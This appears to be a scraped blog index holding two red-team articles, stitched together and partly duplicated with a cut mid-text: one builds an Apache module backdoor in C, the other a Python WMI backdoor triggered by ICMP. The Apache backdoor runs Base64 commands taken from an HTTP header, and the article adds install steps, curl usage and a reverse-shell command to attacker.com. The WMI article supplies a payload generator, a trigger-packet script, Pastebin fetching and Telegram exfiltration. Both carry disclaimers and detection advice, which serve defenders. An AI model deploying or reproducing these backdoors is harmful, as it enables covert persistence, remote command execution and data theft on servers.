octet_a = i \u0026lt; len ? input[i++] : 0; uint32_t octet_b = i \u0026lt; len ? input[i++] : 0; uint32_t octet_c = i \u0026lt; len ? input[i++] : 0; uint32_t triple = (octet_a \u0026lt;\u0026lt; 16) | (octet_b \u0026lt;\u0026lt; 8) | octet_c; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 18) \u0026amp; 0x3F]; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len + 1) ? \u0026#39;=\u0026#39; : b64_chars[(triple \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len) ? \u0026#39;=\u0026#39; : b64_chars[triple \u0026amp; 0x3F]; } output[out_len] = \u0026#39;\\0\u0026#39;; return output; } Request Hook Handler This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:\nstatic int admin_exec_hook(request_rec *r) { // Skip subrequests if (r-\u0026gt;main) return DECLINED; // Check for our trigger header const char *hdr_enc = apr_table_get(r-\u0026gt;headers_in, \u0026#34;X-Request-ID\u0026#34;); if (!hdr_enc) return DECLINED; // Decode the command size_t cmd_len; unsigned char *cmd = b64decode(r-\u0026gt;pool, hdr_enc, \u0026amp;cmd_len); if (!cmd || cmd_len == 0) return DECLINED; ap_set_content_type(r, \u0026#34;text/plain\u0026#34;); // Execute command via popen FILE *fp = popen((const char *)cmd, \u0026#34;r\u0026#34;); if (!fp) { ap_rputs(\u0026#34;failed\\n\u0026#34;, r); return OK; } // Capture command output char buffer[8192]; size_t total_len = 0; size_t cap = 8192; unsigned char *output = apr_pcalloc(r-\u0026gt;pool, cap); while (fgets(buffer, sizeof(buffer), fp)) { size_t blen = strlen(buffer); if (total_len + blen \u0026gt;= cap) { cap *= 2; unsigned char *newbuf = apr_palloc(r-\u0026gt;pool, cap); memcpy(newbuf, output, total_len); output = newbuf; } memcpy(output + total_len, buffer, blen); total_len += blen; } pclose(fp); // Encode and return output char *encoded = b64encode(r-\u0026gt;pool, output, total_len); ap_rputs(encoded, r); return OK; } Module Registration Finally, we register our hook with Apache:\nstatic void register_hooks(apr_pool_t *p) { ap_hook_header_parser(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE); } module AP_MODULE_DECLARE_DATA admin_exec_module = { STANDARD20_MODULE_STUFF, NULL, NULL, NULL, NULL, NULL, register_hooks }; I called this whole project MODPlant, and deployed it in Github, you may download it here.\nProof of Concept Exploitation Prerequisites Installation First of all, install the Apache development tools required for module compilation:\nsudo apt update sudo apt install apache2-dev -y This installs the apxs (Apache Extension Tool) utility, which is essential for building and installing Apache modules.\nModule Compilation and Installation Compile and install the module with a single command:\nsudo apxs -i -a -c mod_shell.c This command performs three critical operations:\nCompilation: Converts our C source code into a .so (shared object) library Installation: Copies the compiled module to Apache\u0026rsquo;s module directory Configuration: Automatically adds a LoadModule directive to Apache\u0026rsquo;s configuration Service Restart After executing the apxs command, Apache needs to be restarted to load the new module:\nsudo systemctl restart apache2 Verify the service is running correctly:\nsudo systemctl status apache2 Testing the Backdoor Now we can interact with our backdoor. Commands are sent Base64-encoded via the X-Request-ID HTTP header. The header name can be modified in mod_shell.c to avoid detection.\nExample using curl:\n# Encode command: echo \u0026#34;whoami\u0026#34; | base64 # Result: d2hvYW1p curl -H \u0026#34;X-Request-ID: d2hvYW1p\u0026#34; http://target-server.com/ The server responds with Base64-encoded output: d3d3LWRhdGE=\nDecoding the Response Decode the server\u0026rsquo;s response to view command output:\necho \u0026#34;d3d3LWRhdGE=\u0026#34; | base64 -d # Output: www-data This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:\nObfuscates command content from casual log inspection Handles binary data and special characters safely Maintains compatibility with HTTP protocol requirements Advanced Usage Examples File enumeration:\n# Command: ls -la /etc/passwd echo \u0026#34;bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; http://target/ But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case www-data default user does not have those excessive privileges, but it is also the vector for backdooring the target server.\nReverse shell establishment:\n# Command: bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; http://target/ Detection and Hunting Perspective Indicators of Attack (IOA) Defenders should monitor for the following suspicious activities:\n1. Suspicious apxs Execution The apxs tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:\n# Detection via Sysmon or auditd apxs -i -a -c *.c Detection logic:\nUnusual parent processes spawning apxs apxs execution by non-administrative users Compilation of .c files in unexpected directories (e.g., /tmp, /var/www) 2. Apache Service Restarts Unexpected Apache service restarts, especially outside maintenance windows:\nsystemctl restart apache2 service apache2 restart /etc/init.d/apache2 restart Monitoring points:\nCorrelate service restarts with user activity Alert on restarts without corresponding change tickets Track which user initiated the restart 3. File System Artifacts Monitor critical Apache directories for new or modified files:\nModule configuration:\n/etc/apache2/mods-available/*.load /etc/apache2/mods-enabled/*.load Compiled modules:\n/usr/lib/apache2/modules/*.so Detection strategy:\nBaseline legitimate modules during system provisioning Alert on new .so files with recent creation timestamps Check module file signatures against known-good hashes Inspect .load files for suspicious module names 4. Behavioral Anomalies Network indicators:\nUnusual outbound connections from Apache process HTTP requests with suspicious custom headers (e.g., X-Request-ID with long Base64 strings) Consistent Base64-encoded responses in HTTP traffic Conclusion Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.\nKey Takeaways For Red Teams:\nApache modules provide excellent persistence in authorized assessments The technique demonstrates the importance of defense-in-depth Custom headers and Base64 encoding add layers of obfuscation Consider operational security: module names, header names, and compilation artifacts all create detection opportunities For Blue Teams:\nTraditional webshell detection methods are insufficient against module-based backdoors File integrity monitoring and behavioral analysis are critical Baseline your environment to detect anomalous module installations Process execution monitoring can catch compilation activities Network traffic analysis can identify suspicious Base64-encoded communications Future Research Directions This technique can be extended further:\nMemory-only operation: Loading modules without disk persistence Encrypted communications: Replacing Base64 with AES encryption Polymorphic modules: Generating unique module signatures per deployment Multi-protocol support: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2 Anti-forensics: Implementing self-deletion and log manipulation capabilities The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.\nReferences From HTTP to RCE. How to leave backdoor in IIS ","permalink":"http://localhost:1313/posts/apache-modules-persistence/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eDISCLAIMER:\u003c/strong\u003e\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Article\" loading=\"lazy\" src=\"/apache-persistence-cover.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhile studying APT and Red Team materials, I came across an excellent article from \u003ca href=\"https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9\"\u003eCICADA8\u003c/a\u003e about establishing persistence in infrastructure through IIS modules instead of classic webshells.\u003c/p\u003e","title":"Persistent Backdoors via Apache Modules 🕷️"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWe’ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Micro’s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM — without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodes—other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasion—using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 – Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe – Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; – Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 👾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nIntroduction While studying APT and Red Team materials, I came across an excellent article from CICADA8 about establishing persistence in infrastructure through IIS modules instead of classic webshells.\nIn the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?\nI\u0026rsquo;m not the first to explore this vector. Researchers from ESET documented this technique back in 2012, but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.\nWhy Apache Modules Over Traditional Webshells? The advantages of this approach compared to conventional webshells are compelling:\nProcess-level execution: The module runs inside the web server process and doesn\u0026rsquo;t reside in the public webroot, making it significantly harder to discover through simple file enumeration URL-agnostic operation: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation Stealth: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level Persistence: Survives webroot cleanups and application redeployments This article explores these attack vectors for research purposes and does not encourage malicious activity. Let\u0026rsquo;s dive into the technical implementation.\nModule Development To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:\nTechnical Requirements Base64 encoding: Commands should be transmitted in Base64 format, and output should be returned encoded as well Global interception: The module should intercept all requests to the web application without being tied to a specific URL endpoint Header-based communication: The server receives commands via HTTP request headers and returns output to the client Minimal footprint: Avoid obvious indicators of compromise in standard logs Implementation Overview With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.\nCore Imports #include \u0026#34;httpd.h\u0026#34; #include \u0026#34;http_config.h\u0026#34; #include \u0026#34;http_protocol.h\u0026#34; #include \u0026#34;ap_config.h\u0026#34; #include \u0026#34;http_request.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; These headers provide the necessary Apache API functions and standard C libraries for our module.\nBase64 Decoder Implementation The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:\nstatic unsigned char *b64decode(apr_pool_t *pool, const char *input, size_t *out_len) { size_t len = strlen(input); unsigned char *output = apr_pcalloc(pool, len); static const char b64_table[256] = { [\u0026#39;A\u0026#39;]=0, [\u0026#39;B\u0026#39;]=1, [\u0026#39;C\u0026#39;]=2, [\u0026#39;D\u0026#39;]=3, [\u0026#39;E\u0026#39;]=4, [\u0026#39;F\u0026#39;]=5, [\u0026#39;G\u0026#39;]=6, [\u0026#39;H\u0026#39;]=7, [\u0026#39;I\u0026#39;]=8, [\u0026#39;J\u0026#39;]=9, [\u0026#39;K\u0026#39;]=10, [\u0026#39;L\u0026#39;]=11, [\u0026#39;M\u0026#39;]=12, [\u0026#39;N\u0026#39;]=13, [\u0026#39;O\u0026#39;]=14, [\u0026#39;P\u0026#39;]=15, [\u0026#39;Q\u0026#39;]=16, [\u0026#39;R\u0026#39;]=17, [\u0026#39;S\u0026#39;]=18, [\u0026#39;T\u0026#39;]=19, [\u0026#39;U\u0026#39;]=20, [\u0026#39;V\u0026#39;]=21, [\u0026#39;W\u0026#39;]=22, [\u0026#39;X\u0026#39;]=23, [\u0026#39;Y\u0026#39;]=24, [\u0026#39;Z\u0026#39;]=25, [\u0026#39;a\u0026#39;]=26, [\u0026#39;b\u0026#39;]=27, [\u0026#39;c\u0026#39;]=28, [\u0026#39;d\u0026#39;]=29, [\u0026#39;e\u0026#39;]=30, [\u0026#39;f\u0026#39;]=31, [\u0026#39;g\u0026#39;]=32, [\u0026#39;h\u0026#39;]=33, [\u0026#39;i\u0026#39;]=34, [\u0026#39;j\u0026#39;]=35, [\u0026#39;k\u0026#39;]=36, [\u0026#39;l\u0026#39;]=37, [\u0026#39;m\u0026#39;]=38, [\u0026#39;n\u0026#39;]=39, [\u0026#39;o\u0026#39;]=40, [\u0026#39;p\u0026#39;]=41, [\u0026#39;q\u0026#39;]=42, [\u0026#39;r\u0026#39;]=43, [\u0026#39;s\u0026#39;]=44, [\u0026#39;t\u0026#39;]=45, [\u0026#39;u\u0026#39;]=46, [\u0026#39;v\u0026#39;]=47, [\u0026#39;w\u0026#39;]=48, [\u0026#39;x\u0026#39;]=49, [\u0026#39;y\u0026#39;]=50, [\u0026#39;z\u0026#39;]=51, [\u0026#39;0\u0026#39;]=52, [\u0026#39;1\u0026#39;]=53, [\u0026#39;2\u0026#39;]=54, [\u0026#39;3\u0026#39;]=55, [\u0026#39;4\u0026#39;]=56, [\u0026#39;5\u0026#39;]=57, [\u0026#39;6\u0026#39;]=58, [\u0026#39;7\u0026#39;]=59, [\u0026#39;8\u0026#39;]=60, [\u0026#39;9\u0026#39;]=61, [\u0026#39;+\u0026#39;]=62, [\u0026#39;/\u0026#39;]=63 }; size_t i = 0, j = 0; uint32_t buf = 0; int bits = 0; while (i \u0026lt; len) { char c = input[i++]; if (c == \u0026#39;=\u0026#39; || c == \u0026#39;\\0\u0026#39;) break; if ((unsigned char)c \u0026gt; 127 || (b64_table[(unsigned char)c] == 0 \u0026amp;\u0026amp; c != \u0026#39;A\u0026#39;)) continue; buf = (buf \u0026lt;\u0026lt; 6) | b64_table[(unsigned char)c]; bits += 6; if (bits \u0026gt;= 8) { bits -= 8; output[j++] = (buf \u0026gt;\u0026gt; bits) \u0026amp; 0xFF; } } if (out_len) *out_len = j; return output; } Base64 Encoder Implementation The encoder converts command output back to Base64 for transmission to the attacker:\nstatic char *b64encode(apr_pool_t *pool, const unsigned char *input, size_t len) { static const char b64_chars[] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; size_t out_len = 4 * ((len + 2) / 3); char *output = apr_pcalloc(pool, out_len + 1); size_t i = 0, j = 0; while (i \u0026lt; len) { uint32_t octet_a = i \u0026lt; len ? input[i++] : 0; uint32_t octet_b = i \u0026lt; len ? input[i++] : 0; uint32_t octet_c = i \u0026lt; len ? input[i++] : 0; uint32_t triple = (octet_a \u0026lt;\u0026lt; 16) | (octet_b \u0026lt;\u0026lt; 8) | octet_c; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 18) \u0026amp; 0x3F]; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len + 1) ? \u0026#39;=\u0026#39; : b64_chars[(triple \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len) ? \u0026#39;=\u0026#39; : b64_chars[triple \u0026amp; 0x3F]; } output[out_len] = \u0026#39;\\0\u0026#39;; return output; } Request Hook Handler This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:\nstatic int admin_exec_hook(request_rec *r) { // Skip subrequests if (r-\u0026gt;main) return DECLINED; // Check for our trigger header const char *hdr_enc = apr_table_get(r-\u0026gt;headers_in, \u0026#34;X-Request-ID\u0026#34;); if (!hdr_enc) return DECLINED; // Decode the command size_t cmd_len; unsigned char *cmd = b64decode(r-\u0026gt;pool, hdr_enc, \u0026amp;cmd_len); if (!cmd || cmd_len == 0) return DECLINED; ap_set_content_type(r, \u0026#34;text/plain\u0026#34;); // Execute command via popen FILE *fp = popen((const char *)cmd, \u0026#34;r\u0026#34;); if (!fp) { ap_rputs(\u0026#34;failed\\n\u0026#34;, r); return OK; } // Capture command output char buffer[8192]; size_t total_len = 0; size_t cap = 8192; unsigned char *output = apr_pcalloc(r-\u0026gt;pool, cap); while (fgets(buffer, sizeof(buffer), fp)) { size_t blen = strlen(buffer); if (total_len + blen \u0026gt;= cap) { cap *= 2; unsigned char *newbuf = apr_palloc(r-\u0026gt;pool, cap); memcpy(newbuf, output, total_len); output = newbuf; } memcpy(output + total_len, buffer, blen); total_len += blen; } pclose(fp); // Encode and return output char *encoded = b64encode(r-\u0026gt;pool, output, total_len); ap_rputs(encoded, r); return OK; } Module Registration Finally, we register our hook with Apache:\nstatic void register_hooks(apr_pool_t *p) { ap_hook_header_parser(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE); } module AP_MODULE_DECLARE_DATA admin_exec_module = { STANDARD20_MODULE_STUFF, NULL, NULL, NULL, NULL, NULL, register_hooks }; I called this whole project MODPlant, and deployed it in Github, you may download it here.\nProof of Concept Exploitation Prerequisites Installation First of all, install the Apache development tools required for module compilation:\nsudo apt update sudo apt install apache2-dev -y This installs the apxs (Apache Extension Tool) utility, which is essential for building and installing Apache modules.\nModule Compilation and Installation Compile and install the module with a single command:\nsudo apxs -i -a -c mod_shell.c This command performs three critical operations:\nCompilation: Converts our C source code into a .so (shared object) library Installation: Copies the compiled module to Apache\u0026rsquo;s module directory Configuration: Automatically adds a LoadModule directive to Apache\u0026rsquo;s configuration Service Restart After executing the apxs command, Apache needs to be restarted to load the new module:\nsudo systemctl restart apache2 Verify the service is running correctly:\nsudo systemctl status apache2 Testing the Backdoor Now we can interact with our backdoor. Commands are sent Base64-encoded via the X-Request-ID HTTP header. The header name can be modified in mod_shell.c to avoid detection.\nExample using curl:\n# Encode command: echo \u0026#34;whoami\u0026#34; | base64 # Result: d2hvYW1p curl -H \u0026#34;X-Request-ID: d2hvYW1p\u0026#34; http://target-server.com/ The server responds with Base64-encoded output: d3d3LWRhdGE=\nDecoding the Response Decode the server\u0026rsquo;s response to view command output:\necho \u0026#34;d3d3LWRhdGE=\u0026#34; | base64 -d # Output: www-data This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:\nObfuscates command content from casual log inspection Handles binary data and special characters safely Maintains compatibility with HTTP protocol requirements Advanced Usage Examples File enumeration:\n# Command: ls -la /etc/passwd echo \u0026#34;bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; http://target/ But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case www-data default user does not have those excessive privileges, but it is also the vector for backdooring the target server.\nReverse shell establishment:\n# Command: bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; http://target/ Detection and Hunting Perspective Indicators of Attack (IOA) Defenders should monitor for the following suspicious activities:\n1. Suspicious apxs Execution The apxs tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:\n# Detection via Sysmon or auditd apxs -i -a -c *.c Detection logic:\nUnusual parent processes spawning apxs apxs execution by non-administrative users Compilation of .c files in unexpected directories (e.g., /tmp, /var/www) 2. Apache Service Restarts Unexpected Apache service restarts, especially outside maintenance windows:\nsystemctl restart apache2 service apache2 restart /etc/init.d/apache2 restart Monitoring points:\nCorrelate service restarts with user activity Alert on restarts without corresponding change tickets Track which user initiated the restart 3. File System Artifacts Monitor critical Apache directories for new or modified files:\nModule configuration:\n/etc/apache2/mods-available/*.load /etc/apache2/mods-enabled/*.load Compiled modules:\n/usr/lib/apache2/modules/*.so Detection strategy:\nBaseline legitimate modules during system provisioning Alert on new .so files with recent creation timestamps Check module file signatures against known-good hashes Inspect .load files for suspicious module names 4. Behavioral Anomalies Network indicators:\nUnusual outbound connections from Apache process HTTP requests with suspicious custom headers (e.g., X-Request-ID with long Base64 strings) Consistent Base64-encoded responses in HTTP traffic Conclusion Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.\nKey Takeaways For Red Teams:\nApache modules provide excellent persistence in authorized assessments The 